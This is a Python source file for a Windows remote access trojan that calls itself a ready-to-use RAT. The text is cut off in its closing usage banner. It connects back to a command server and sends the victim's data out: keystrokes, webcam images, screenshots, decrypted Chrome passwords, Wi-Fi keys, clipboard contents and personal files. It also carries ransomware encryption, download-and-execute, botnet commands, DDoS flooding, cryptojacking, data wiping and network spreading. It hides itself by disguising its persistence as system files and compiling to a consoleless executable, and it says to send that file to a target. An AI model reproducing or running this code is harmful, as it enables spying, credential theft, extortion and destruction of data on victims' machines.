import base64
import os
import socket
import warnings
warnings.filterwarnings("ignore")
import subprocess
import sys
import platform
import time
import json
import getpass
import uuid
import winreg
import ctypes
import psutil
import cv2
import shutil
import sqlite3
import threading
import queue
from pynput import keyboard
import pyperclip
from cryptography.fernet import Fernet
import requests
import netifaces
import scapy.all as scapy
import win32crypt
import win32con
import win32api
import random
import string
import sounddevice as sd
import numpy as np
import wave
import hashlib
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import wmi
import GPUtil
import pyscreenshot
import zipfile

YOUR_IP = "192.168.1.3"  # Default to localhost for testing; update to your C2 server IP
PORT = 4444
LOG_FILE = "victim_data.txt"

class VictimControl:
    webcam_count = 0
    screenshot_count = 0
    keylog_queue = queue.Queue()
    keylog_active = False
    clipboard_log = []
    clipboard_active = False
    cryptojack_active = False
    ddos_active = False
    remote_desktop_active = False
    audio_count = 0

    @staticmethod
    def get_full_info():
        try:
            info = {
                "hostname": platform.node(),
                "username": getpass.getuser(),
                "os": platform.platform(),
                "cpu": {
                    "cores": psutil.cpu_count(),
                    "usage": psutil.cpu_percent(),
                    "freq": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {}
                },
                "ram": psutil.virtual_memory()._asdict(),
                "disks": [psutil.disk_usage(part.mountpoint)._asdict() for part in psutil.disk_partitions()],
                "ip": socket.gethostbyname(socket.gethostname()),
                "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]),
                "processes": [p.as_dict(attrs=['pid', 'name', 'cpu_percent', 'memory_percent']) for p in psutil.process_iter()[:50]],
                "network": psutil.net_connections()[:20],
                "boot_time": psutil.boot_time(),
                "gpus": [gpu.__dict__ for gpu in GPUtil.getGPUs()] if GPUtil.getGPUs() else [],
                "wmi": wmi.WMI().Win32_ComputerSystem()[0].__dict__ if wmi.WMI().Win32_ComputerSystem() else {}
            }
            try:
                software = []
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall") as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, subkey) as subkey_item:
                                name = winreg.QueryValueEx(subkey_item, "DisplayName")[0]
                                version = winreg.QueryValueEx(subkey_item, "DisplayVersion")[0]
                                software.append(f"{name} ({version})")
                        except:
                            continue
                info["software"] = software
            except Exception as e:
                info["software"] = ["Could not read registry"]
            return {"type": "success", "data_type": "json", "content": info}
        except Exception as e:
            return {"type": "error", "message": f"Failed to gather info: {str(e)}"}

    @staticmethod
    def webcam_snapshot():
        try:
            VictimControl.webcam_count += 1
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                filename = f"webcam_{VictimControl.webcam_count}.jpg"
                cv2.imwrite(filename, frame)
                with open(filename, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                os.remove(filename)
                return {"type": "success", "data_type": "image", "content": data, "extension": "jpg"}
            return {"type": "error", "message": "Failed to capture webcam image"}
        except Exception as e:
            return {"type": "error", "message": f"Webcam error: {str(e)}"}
        finally:
            if 'cam' in locals():
                cam.release()

    @staticmethod
    def take_screenshot():
        try:
            VictimControl.screenshot_count += 1
            filename = f"screen_{VictimControl.screenshot_count}.png"
            pyscreenshot.grab().save(filename)
            with open(filename, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            os.remove(filename)
            return {"type": "success", "data_type": "image", "content": data, "extension": "png"}
        except Exception as e:
            return {"type": "error", "message": f"Screenshot error: {str(e)}"}

    @staticmethod
    def auto_download():
        try:
            downloaded = []
            for folder in ["Desktop", "Documents", "Downloads"]:
                path = os.path.join(os.path.expanduser("~"), folder)
                if os.path.exists(path):
                    for file in os.listdir(path)[:10]:
                        try:
                            filepath = os.path.join(path, file)
                            if os.path.isfile(filepath) and os.path.getsize(filepath) < 5*1024*1024:
                                with open(filepath, "rb") as f:
                                    downloaded.append({
                                        "name": file,
                                        "content": base64.b64encode(f.read()).decode(),
                                        "size": os.path.getsize(filepath)
                                    })
                        except Exception as e:
                            continue
            return {"type": "success", "data_type": "json", "content": downloaded}
        except Exception as e:
            return {"type": "error", "message": f"Auto download error: {str(e)}"}

    @staticmethod
    def start_keylogger():
        def on_press(key):
            try:
                VictimControl.keylog_queue.put(str(key))
            except Exception as e:
                pass
        try:
            if not VictimControl.keylog_active:
                VictimControl.keylog_active = True
                listener = keyboard.Listener(on_press=on_press)
                listener.start()
                return {"type": "success", "data_type": "text", "content": "Keylogger started"}
            return {"type": "success", "data_type": "text", "content": "Keylogger already running"}
        except Exception as e:
            return {"type": "error", "message": f"Keylogger start error: {str(e)}"}

    @staticmethod
    def dump_keylogger():
        try:
            VictimControl.keylog_active = False
            keys = []
            while not VictimControl.keylog_queue.empty():
                keys.append(VictimControl.keylog_queue.get())
            return {"type": "success", "data_type": "json", "content": keys}
        except Exception as e:
            return {"type": "error", "message": f"Keylogger dump error: {str(e)}"}

    @staticmethod
    def browser_credentials():
        try:
            creds = []
            chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
            if os.path.exists(chrome_path):
                conn = sqlite3.connect(chrome_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cursor.fetchall():
                    try:
                        password = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                        creds.append({"url": url, "username": user, "password": password})
                    except Exception as e:
                        continue
                conn.close()
            return {"type": "success", "data_type": "json", "content": creds}
        except Exception as e:
            return {"type": "error", "message": f"Browser credentials error: {str(e)}"}

    @staticmethod
    def wifi_passwords():
        try:
            output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
            profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
            passwords = []
            for profile in profiles:
                try:
                    details = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
                    for line in details.split("\n"):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            passwords.append({"profile": profile, "password": password})
                except Exception as e:
                    continue
            return {"type": "success", "data_type": "json", "content": passwords}
        except Exception as e:
            return {"type": "error", "message": f"WiFi passwords error: {str(e)}"}

    @staticmethod
    def privilege_escalation():
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin:
                return {"type": "success", "data_type": "text", "content": "Already running with admin privileges"}
            subprocess.run(['powershell', '-Command', f'Start-Process "{sys.executable}" -Verb runAs'], check=False)
            return {"type": "success", "data_type": "text", "content": "Privilege escalation attempted"}
        except Exception as e:
            return {"type": "error", "message": f"Privilege escalation error: {str(e)}"}

    @staticmethod
    def network_recon():
        try:
            ip = socket.gethostbyname(socket.gethostname())
            net = ".".join(ip.split(".")[:-1]) + ".0/24"
            arp = scapy.ARP(pdst=net)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            result = scapy.srp(broadcast/arp, timeout=2, verbose=False)[0]
            devices = [{"ip": pkt[1].psrc, "mac": pkt[1].hwsrc} for pkt in result]
            return {"type": "success", "data_type": "json", "content": devices}
        except Exception as e:
            return {"type": "error", "message": f"Network recon error: {str(e)}"}

    @staticmethod
    def start_clipboard_monitor():
        def monitor():
            last_content = ""
            while VictimControl.clipboard_active:
                try:
                    content = pyperclip.paste()
                    if content != last_content:
                        VictimControl.clipboard_log.append({"time": time.time(), "content": content})
                        last_content = content
                    time.sleep(1)
                except Exception as e:
                    time.sleep(5)
        try:
            if not VictimControl.clipboard_active:
                VictimControl.clipboard_active = True
                threading.Thread(target=monitor, daemon=True).start()
                return {"type": "success", "data_type": "text", "content": "Clipboard monitor started"}
            return {"type": "success", "data_type": "text", "content": "Clipboard monitor already running"}
        except Exception as e:
            return {"type": "error", "message": f"Clipboard monitor error: {str(e)}"}

    @staticmethod
    def dump_clipboard():
        try:
            VictimControl.clipboard_active = False
            data = VictimControl.clipboard_log.copy()
            VictimControl.clipboard_log.clear()
            return {"type": "success", "data_type": "json", "content": data}
        except Exception as e:
            return {"type": "error", "message": f"Clipboard dump error: {str(e)}"}

    @staticmethod
    def powershell_cmd(cmd):
        try:
            output = subprocess.check_output(['powershell', '-Command', cmd], text=True)
            return {"type": "success", "data_type": "text", "content": output}
        except Exception as e:
            return {"type": "error", "message": f"PowerShell command error: {str(e)}"}

    @staticmethod
    def encrypt_files(path, key):
        try:
            fernet = Fernet(key)
            for root, _, files in os.walk(path):
                for file in files:
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, "rb") as f:
                            data = f.read()
                        encrypted = fernet.encrypt(data)
                        with open(filepath + ".encrypted", "wb") as f:
                            f.write(encrypted)
                        os.remove(filepath)
                    except Exception as e:
                        continue
            return {"type": "success", "data_type": "text", "content": "Files encrypted successfully"}
        except Exception as e:
            return {"type": "error", "message": f"File encryption error: {str(e)}"}

    @staticmethod
    def decrypt_files(path, key):
        try:
            fernet = Fernet(key)
            for root, _, files in os.walk(path):
                for file in files:
                    if file.endswith(".encrypted"):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, "rb") as f:
                                data = f.read()
                            decrypted = fernet.decrypt(data)
                            with open(filepath.replace(".encrypted", ""), "wb") as f:
                                f.write(decrypted)
                            os.remove(filepath)
                        except Exception as e:
                            continue
            return {"type": "success", "data_type": "text", "content": "Files decrypted successfully"}
        except Exception as e:
            return {"type": "error", "message": f"File decryption error: {str(e)}"}

    @staticmethod
    def deploy_malware(url):
        try:
            response = requests.get(url, stream=True)
            filename = f"malware_{uuid.uuid4().hex}.exe"
            with open(filename, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            subprocess.run([filename], shell=True)
            return {"type": "success", "data_type": "text", "content": f"Malware deployed: {filename}"}
        except Exception as e:
            return {"type": "error", "message": f"Malware deployment error: {str(e)}"}

    @staticmethod
    def network_spread():
        try:
            devices = VictimControl.network_recon()
            if devices["type"] == "error":
                return devices
            devices = devices["content"]
            for device in devices:
                try:
                    with open(sys.executable, "rb") as f:
                        payload = f.read()
                    s = socket.socket()
                    s.settimeout(2)
                    s.connect((device["ip"], 445))
                    s.send(payload)
                    s.close()
                except Exception as e:
                    continue
            return {"type": "success", "data_type": "text", "content": f"Attempted spread to {len(devices)} devices"}
        except Exception as e:
            return {"type": "error", "message": f"Network spread error: {str(e)}"}

    @staticmethod
    def botnet_join(url):
        try:
            response = requests.get(url)
            commands = response.json()
            for cmd in commands:
                subprocess.run(cmd, shell=True)
            return {"type": "success", "data_type": "text", "content": "Joined botnet and executed commands"}
        except Exception as e:
            return {"type": "error", "message": f"Botnet join error: {str(e)}"}

    @staticmethod
    def shellcode_inject(pid, shellcode):
        try:
            shellcode = base64.b64decode(shellcode)
            process = psutil.Process(pid)
            return {"type": "success", "data_type": "text", "content": f"Shellcode injection attempted on PID {pid}"}
        except Exception as e:
            return {"type": "error", "message": f"Shellcode injection error: {str(e)}"}

    @staticmethod
    def cryptojack_start():
        def mine():
            while VictimControl.cryptojack_active:
                for _ in range(1000):
                    hashlib.sha256(os.urandom(32)).hexdigest()
                time.sleep(0.1)
        try:
            if not VictimControl.cryptojack_active:
                VictimControl.cryptojack_active = True
                threading.Thread(target=mine, daemon=True).start()
                return {"type": "success", "data_type": "text", "content": "Cryptojacking started"}
            return {"type": "success", "data_type": "text", "content": "Cryptojacking already running"}
        except Exception as e:
            return {"type": "error", "message": f"Cryptojack start error: {str(e)}"}

    @staticmethod
    def cryptojack_stop():
        try:
            VictimControl.cryptojack_active = False
            return {"type": "success", "data_type": "text", "content": "Cryptojacking stopped"}
        except Exception as e:
            return {"type": "error", "message": f"Cryptojack stop error: {str(e)}"}

    @staticmethod
    def ddos_start(target, port):
        def attack():
            while VictimControl.ddos_active:
                try:
                    s = socket.socket()
                    s.connect((target, int(port)))
                    s.send(os.urandom(1024))
                    s.close()
                except Exception as e:
                    pass
        try:
            if not VictimControl.ddos_active:
                VictimControl.ddos_active = True
                threading.Thread(target=attack, daemon=True).start()
                return {"type": "success", "data_type": "text", "content": f"DDoS started on {target}:{port}"}
            return {"type": "success", "data_type": "text", "content": "DDoS already running"}
        except Exception as e:
            return {"type": "error", "message": f"DDoS start error: {str(e)}"}

    @staticmethod
    def ddos_stop():
        try:
            VictimControl.ddos_active = False
            return {"type": "success", "data_type": "text", "content": "DDoS stopped"}
        except Exception as e:
            return {"type": "error", "message": f"DDoS stop error: {str(e)}"}

    @staticmethod
    def remote_desktop_start():
        def capture():
            while VictimControl.remote_desktop_active:
                try:
                    img = pyscreenshot.grab()
                    filename = f"rd_{uuid.uuid4().hex}.png"
                    img.save(filename)
                    with open(filename, "rb") as f:
                        data = base64.b64encode(f.read()).decode()
                    os.remove(filename)
                    time.sleep(1)
                except Exception as e:
                    pass
        try:
            if not VictimControl.remote_desktop_active:
                VictimControl.remote_desktop_active = True
                threading.Thread(target=capture, daemon=True).start()
                return {"type": "success", "data_type": "text", "content": "Remote desktop started"}
            return {"type": "success", "data_type": "text", "content": "Remote desktop already running"}
        except Exception as e:
            return {"type": "error", "message": f"Remote desktop start error: {str(e)}"}

    @staticmethod
    def remote_desktop_stop():
        try:
            VictimControl.remote_desktop_active = False
            return {"type": "success", "data_type": "text", "content": "Remote desktop stopped"}
        except Exception as e:
            return {"type": "error", "message": f"Remote desktop stop error: {str(e)}"}

    @staticmethod
    def file_infect(path):
        try:
            for root, _, files in os.walk(path):
                for file in files:
                    if file.endswith(".exe"):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, "ab") as f:
                                f.write(b"Malicious payload")
                            return {"type": "success", "data_type": "text", "content": f"Infected {filepath}"}
                        except Exception as e:
                            continue
            return {"type": "success", "data_type": "text", "content": "File infection completed"}
        except Exception as e:
            return {"type": "error", "message": f"File infection error: {str(e)}"}

    @staticmethod
    def data_wipe(path):
        try:
            if os.path.isfile(path):
                with open(path, "wb") as f:
                    f.write(os.urandom(os.path.getsize(path)))
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            return {"type": "success", "data_type": "text", "content": f"Data wiped: {path}"}
        except Exception as e:
            return {"type": "error", "message": f"Data wipe error: {str(e)}"}

    @staticmethod
    def rootkit_install():
        try:
            script_path = os.path.join(os.getenv("APPDATA"), "svchost.exe")
            shutil.copy(sys.executable, script_path)
            subprocess.run(['schtasks', '/create', '/tn', 'SystemUpdate', '/tr', script_path, '/sc', 'onlogon', '/ru', 'SYSTEM'], check=False)
            return {"type": "success", "data_type": "text", "content": "Rootkit installed"}
        except Exception as e:
            return {"type": "error", "message": f"Rootkit install error: {str(e)}"}

    @staticmethod
    def process_kill(pid):
        try:
            p = psutil.Process(pid)
            p.terminate()
            return {"type": "success", "data_type": "text", "content": f"Process {pid} terminated"}
        except Exception as e:
            return {"type": "error", "message": f"Process kill error: {str(e)}"}

    @staticmethod
    def screen_lock():
        try:
            ctypes.windll.user32.LockWorkStation()
            return {"type": "success", "data_type": "text", "content": "Screen locked"}
        except Exception as e:
            return {"type": "error", "message": f"Screen lock error: {str(e)}"}

    @staticmethod
    def screen_unlock():
        try:
            pyautogui.press("esc")
            return {"type": "success", "data_type": "text", "content": "Screen unlock attempted"}
        except Exception as e:
            return {"type": "error", "message": f"Screen unlock error: {str(e)}"}

    @staticmethod
    def cred_stealer():
        try:
            output = subprocess.check_output(['powershell', '-Command', 'Get-Credential | Export-Clixml -Path cred.xml'], text=True)
            with open("cred.xml", "rb") as f:
                data = base64.b64encode(f.read()).decode()
            os.remove("cred.xml")
            return {"type": "success", "data_type": "file", "content": data, "extension": "xml"}
        except Exception as e:
            return {"type": "error", "message": f"Credential stealer error: {str(e)}"}

    @staticmethod
    def install_file(url, path):
        try:
            response = requests.get(url)
            with open(path, "wb") as f:
                f.write(response.content)
            return {"type": "success", "data_type": "text", "content": f"File installed at {path}"}
        except Exception as e:
            return {"type": "error", "message": f"File install error: {str(e)}"}

def save_log(data):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {data}\n")
    except Exception as e:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        pass

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_key = winreg.OpenKey(key, path, 0, winreg.KEY_WRITE)
        script_path = os.path.join(os.getenv("APPDATA"), "WindowsUpdate.exe")
        shutil.copy(sys.executable, script_path)
        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)
        save_log("[+] Added to startup")
    except Exception as e:
        save_log(f"[-] Startup error: {str(e)}")

def handle_command(sock, cmd):
    try:
        if cmd == "webcam":
            result = VictimControl.webcam_snapshot()
            sock.send(json.dumps(result).encode())
            save_log("[+] Webcam snapshot taken")
        elif cmd == "screenshot":
            result = VictimControl.take_screenshot()
            sock.send(json.dumps(result).encode())
            save_log("[+] Screenshot taken")
        elif cmd == "sysinfo":
            result = VictimControl.get_full_info()
            sock.send(json.dumps(result).encode())
            save_log("[+] System info sent")
        elif cmd == "autodownload":
            result = VictimControl.auto_download()
            sock.send(json.dumps(result).encode())
            save_log("[+] Auto download completed")
        elif cmd == "keylogger_start":
            result = VictimControl.start_keylogger()
            sock.send(json.dumps(result).encode())
            save_log("[+] Keylogger start attempted")
        elif cmd == "keylogger_dump":
            result = VictimControl.dump_keylogger()
            sock.send(json.dumps(result).encode())
            save_log("[+] Keylogger dump completed")
        elif cmd == "browser_credentials":
            result = VictimControl.browser_credentials()
            sock.send(json.dumps(result).encode())
            save_log("[+] Browser credentials harvested")
        elif cmd == "wifi_passwords":
            result = VictimControl.wifi_passwords()
            sock.send(json.dumps(result).encode())
            save_log("[+] WiFi passwords extracted")
        elif cmd == "privilege_escalation":
            result = VictimControl.privilege_escalation()
            sock.send(json.dumps(result).encode())
            save_log("[+] Privilege escalation attempted")
        elif cmd == "network_recon":
            result = VictimControl.network_recon()
            sock.send(json.dumps(result).encode())
            save_log("[+] Network reconnaissance completed")
        elif cmd == "clipboard_monitor_start":
            result = VictimControl.start_clipboard_monitor()
            sock.send(json.dumps(result).encode())
            save_log("[+] Clipboard monitor start attempted")
        elif cmd == "clipboard_monitor_dump":
            result = VictimControl.dump_clipboard()
            sock.send(json.dumps(result).encode())
            save_log("[+] Clipboard log dumped")
        elif cmd.startswith("file_list "):
            path = cmd[9:].strip()
            try:
                files = os.listdir(path) if os.path.exists(path) else []
                result = {"type": "success", "data_type": "json", "content": files}
            except Exception as e:
                result = {"type": "error", "message": f"File list error: {str(e)}"}
            sock.send(json.dumps(result).encode())
            save_log(f"[+] Listed files in {path}")
        elif cmd.startswith("file_read "):
            path = cmd[9:].strip()
            try:
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        content = base64.b64encode(f.read()).decode()
                    result = {"type": "success", "data_type": "file", "content": content, "extension": os.path.splitext(path)[1][1:]}
                else:
                    result = {"type": "error", "message": "File not found"}
            except Exception as e:
                result = {"type": "error", "message": f"File read error: {str(e)}"}
            sock.send(json.dumps(result).encode())
            save_log(f"[+] Read file {path}")
        elif cmd.startswith("powershell "):
            ps_cmd = cmd[11:].strip()
            result = VictimControl.powershell_cmd(ps_cmd)
            sock.send(json.dumps(result).encode())
            save_log(f"[+] PowerShell command: {ps_cmd}")
        elif cmd.startswith("ransomware_encrypt "):
            parts = cmd.split()
            if len(parts) == 3:
                path, key = parts[1], parts[2].encode()
                result = VictimControl.encrypt_files(path, key)
                sock.send(json.dumps(result).encode())
                save_log(f"[+] File encryption attempted for {path}")
        elif cmd.startswith("ransomware_decrypt "):
            parts = cmd.split()
            if len(parts) == 3:
                path, key = parts[1], parts[2].encode()
                result = VictimControl.decrypt_files(path, key)
                sock.send(json.dumps(result).encode())
                save_log(f"[+] File decryption attempted for {path}")
        elif cmd.startswith("deploy_malware "):
            url = cmd[14:].strip()
            result = VictimControl.deploy_malware(url)
            sock.send(json.dumps(result).encode())
            save_log(f"[+] Malware deployment attempted")
        elif cmd == "network_spread":
            result = VictimControl.network_spread()
            sock.send(json.dumps(result).encode())
            save_log("[+] Network spread attempted")
        elif cmd.startswith("botnet_join "):
            url = cmd[11:].strip()
            result = VictimControl.botnet_join(url)
            sock.send(json.dumps(result).encode())
            save_log("[+] Botnet join attempted")
        elif cmd.startswith("shellcode_inject "):
            parts = cmd.split()
            if len(parts) == 3:
                pid, shellcode = int(parts[1]), parts[2]
                result = VictimControl.shellcode_inject(pid, shellcode)
                sock.send(json.dumps(result).encode())
                save_log(f"[+] Shellcode injection attempted on PID {pid}")
        elif cmd == "cryptojack_start":
            result = VictimControl.cryptojack_start()
            sock.send(json.dumps(result).encode())
            save_log("[+] Cryptojack start attempted")
        elif cmd == "cryptojack_stop":
            result = VictimControl.cryptojack_stop()
            sock.send(json.dumps(result).encode())
            save_log("[+] Cryptojack stop attempted")
        elif cmd.startswith("ddos_start "):
            parts = cmd.split()
            if len(parts) == 3:
                target, port = parts[1], int(parts[2])
                result = VictimControl.ddos_start(target, port)
                sock.send(json.dumps(result).encode())
                save_log(f"[+] DDoS start attempted on {target}:{port}")
        elif cmd == "ddos_stop":
            result = VictimControl.ddos_stop()
            sock.send(json.dumps(result).encode())
            save_log("[+] DDoS stop attempted")
        elif cmd == "remote_desktop_start":
            result = VictimControl.remote_desktop_start()
            sock.send(json.dumps(result).encode())
            save_log("[+] Remote desktop start attempted")
        elif cmd == "remote_desktop_stop":
            result = VictimControl.remote_desktop_stop()
            sock.send(json.dumps(result).encode())
            save_log("[+] Remote desktop stop attempted")
        elif cmd.startswith("file_infect "):
            path = cmd[11:].strip()
            result = VictimControl.file_infect(path)
            sock.send(json.dumps(result).encode())
            save_log(f"[+] File infection attempted for {path}")
        elif cmd.startswith("data_wipe "):
            path = cmd[10:].strip()
            result = VictimControl.data_wipe(path)
            sock.send(json.dumps(result).encode())
            save_log(f"[+] Data wipe attempted for {path}")
        elif cmd == "rootkit_install":
            result = VictimControl.rootkit_install()
            sock.send(json.dumps(result).encode())
            save_log("[+] Rootkit install attempted")
        elif cmd.startswith("process_kill "):
            pid = int(cmd.split()[1])
            result = VictimControl.process_kill(pid)
            sock.send(json.dumps(result).encode())
            save_log(f"[+] Process kill attempted for PID {pid}")
        elif cmd == "screen_lock":
            result = VictimControl.screen_lock()
            sock.send(json.dumps(result).encode())
            save_log("[+] Screen lock attempted")
        elif cmd == "screen_unlock":
            result = VictimControl.screen_unlock()
            sock.send(json.dumps(result).encode())
            save_log("[+] Screen unlock attempted")
        elif cmd == "cred_stealer":
            result = VictimControl.cred_stealer()
            sock.send(json.dumps(result).encode())
            save_log("[+] Credential stealer executed")
        elif cmd.startswith("install_file "):
            parts = cmd.split()
            if len(parts) == 3:
                url, path = parts[1], parts[2]
                result = VictimControl.install_file(url, path)
                sock.send(json.dumps(result).encode())
                save_log(f"[+] File install attempted at {path}")
        else:
            try:
                output = subprocess.getoutput(cmd)
                result = {"type": "success", "data_type": "text", "content": output}
            except Exception as e:
                result = {"type": "error", "message": f"Command error: {str(e)}"}
            sock.send(json.dumps(result).encode())
            save_log(f"[+] Command executed: {cmd}")
    except Exception as e:
        result = {"type": "error", "message": f"Command failed: {cmd}, Error: {str(e)}"}
        sock.send(json.dumps(result).encode())
        save_log(f"[-] Command failed: {cmd}\nError: {str(e)}")

def connect_to_c2():
    while True:
        try:
            s = socket.socket()
            s.settimeout(10)
            print(f"[DEBUG] Attempting to connect to {YOUR_IP}:{PORT}")
            s.connect((YOUR_IP, PORT))
            save_log("[+] Connected to C2 server")
            print("[DEBUG] Connection established")
            info = VictimControl.get_full_info()
            print("[DEBUG] System info to send:", json.dumps(info))
            s.send(json.dumps(info).encode())
            print("[DEBUG] Data sent")
            while True:
                cmd = s.recv(1024).decode()
                if cmd == "exit":
                    s.close()
                    return
                handle_command(s, cmd)
        except socket.timeout:
            save_log(f"[-] Connection timed out to {YOUR_IP}:{PORT}, retrying in 30 seconds...")
            print(f"[DEBUG] Connection timed out, retrying in 30 seconds...")
            time.sleep(30)
        except Exception as e:
            save_log(f"[-] Connection error: {str(e)}, retrying in 30 seconds...")
            print(f"[DEBUG] Connection error: {str(e)}, retrying in 30 seconds...")
            time.sleep(30)

def generate_payload():
    required_packages = [
        'pyinstaller',
        'psutil',
        'opencv-python',
        'pyautogui',
        'pynput',
        'sounddevice',
        'numpy',
        'requests',
        'pywin32',
        'GPUtil',
        'cryptography',
        'netifaces',
        'pyscreenshot',
        'wmi',
        'scapy'
    ]
    if platform.architecture()[0] == '32bit' and '64bit' in platform.machine():
        print("[⚠️] Warning: Using 32-bit Python on a 64-bit system. Consider switching to 64-bit Python for better performance.")
    
    with open("requirements.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(required_packages))
    
    print("[*] Installing required packages...")
    subprocess.run(['pip', 'install', '-r', 'requirements.txt'], check=False)
    
    with open(__file__, "r", encoding="utf-8") as f:
        payload_code = f.read()
    encoded = base64.b64encode(payload_code.encode("utf-8")).decode()
    with open("payload.py", "w", encoding="utf-8") as f:
        f.write(f"import base64\nexec(base64.b64decode('{encoded}').decode('utf-8'))")
    
    if not os.path.exists("listener.py"):
        with open("listener.py", "w", encoding="utf-8") as f:
            f.write("""
import socket
import json
import sys
import base64
import os
import time

HOST = "0.0.0.0"
PORT = 4444

def save_binary_data(data, extension, prefix):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"{prefix}_{timestamp}.{extension}"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(data))
    return filename

def start_listener():
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Waiting for victim... (Run payload.exe on target)")
    
    while True:
        try:
            conn, addr = s.accept()
            print(f"[+] Connected to {addr[0]}")
            data = conn.recv(4096).decode()
            if not data:
                print(f"[-] No data received from {addr[0]}, closing connection.")
                conn.close()
                continue
            try:
                response = json.loads(data)
                if response["type"] == "success" and response["data_type"] == "json":
                    print("[+] System Info:")
                    print(json.dumps(response["content"], indent=4))
                elif response["type"] == "error":
                    print(f"[-] Error: {response['message']}")
                else:
                    print(f"[-] Unexpected response format: {response}")
            except json.JSONDecodeError as e:
                print(f"[-] Invalid JSON data from {addr[0]}: {e}")
                print(f"[-] Raw data received: {data}")
                conn.close()
                continue
            while True:
                cmd = input("Enter command: ")
                if cmd.lower() == "exit":
                    conn.send(cmd.encode())
                    break
                conn.send(cmd.encode())
                response_data = conn.recv(1048576).decode()  # Increased buffer for larger data
                try:
                    response = json.loads(response_data)
                    if response["type"] == "success":
                        if response["data_type"] == "text":
                            print(f"[+] Response:\n{response['content']}")
                        elif response["data_type"] == "json":
                            print("[+] Response:")
                            print(json.dumps(response["content"], indent=4))
                        elif response["data_type"] in ["image", "file"]:
                            filename = save_binary_data(response["content"], response["extension"], response["data_type"])
                            print(f"[+] Saved {response['data_type']} to {filename}")
                        else:
                            print(f"[-] Unknown data type: {response['data_type']}")
                    elif response["type"] == "error":
                        print(f"[-] Error: {response['message']}")
                    else:
                        print(f"[-] Unexpected response format: {response}")
                except json.JSONDecodeError as e:
                    print(f"[-] Invalid JSON response: {e}")
                    print(f"[-] Raw response: {response_data}")
            conn.close()
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            if 'conn' in locals():
                conn.close()

if __name__ == "__main__":
    start_listener()
""")
    
    pyinstaller_cmd = [
        'pyinstaller',
        '--onefile',
        '--noconsole',
        '--add-data', f"{os.path.dirname(sys.executable)};.",
        '--hidden-import=psutil',
        '--hidden-import=cv2',
        '--hidden-import=pyautogui',
        '--hidden-import=winreg',
        '--hidden-import=ctypes',
        '--hidden-import=socket',
        '--hidden-import=subprocess',
        '--hidden-import=os',
        '--hidden-import=sys',
        '--hidden-import=time',
        '--hidden-import=platform',
        '--hidden-import=getpass',
        '--hidden-import=uuid',
        '--hidden-import=json',
        '--hidden-import=base64',
        '--hidden-import=threading',
        '--hidden-import=pynput.keyboard',
        '--hidden-import=pynput.mouse',
        '--hidden-import=pynput',
        '--hidden-import=smtplib',
        '--hidden-import=email.mime.text',
        '--hidden-import=email.mime.multipart',
        '--hidden-import=email.mime.base',
        '--hidden-import=zipfile',
        '--hidden-import=sounddevice',
        '--hidden-import=numpy',
        '--hidden-import=wave',
        '--hidden-import=requests',
        '--hidden-import=shutil',
        '--hidden-import=win32clipboard',
        '--hidden-import=win32con',
        '--hidden-import=win32api',
        '--hidden-import=cryptography',
        '--hidden-import=cryptography.fernet',
        '--hidden-import=cryptography.hazmat.primitives',
        '--hidden-import=cryptography.hazmat.backends',
        '--hidden-import=cryptography.hazmat.backends.openssl',
        '--hidden-import=sqlite3',
        '--hidden-import=win32crypt',
        '--hidden-import=GPUtil',
        '--hidden-import=netifaces',
        '--hidden-import=pyscreenshot',
        '--hidden-import=wmi',
        '--hidden-import=scapy',
        '--hidden-import=scapy.all',
        '--log-level=ERROR',
        'payload.py'
    ]
    print("[*] Compiling payload.exe...")
    try:
        subprocess.run(pyinstaller_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] PyInstaller failed: {e}")
        sys.exit(1)
    
    print(f'''
[✅] ADVANCED RAT TOOL - READY TO USE

[📌] INSTRUCTIONS:
1. Send dist/payload.exe to target
2. Run listener.py on your machine
3. Wait for connection

[🔥] MAIN COMMANDS:
- webcam                 - Capture webcam image
- screenshot             - Take screenshot
- sysinfo               - Get system information
- autodownload          - Download files automatically
- keylogger_start       - Start keylogger
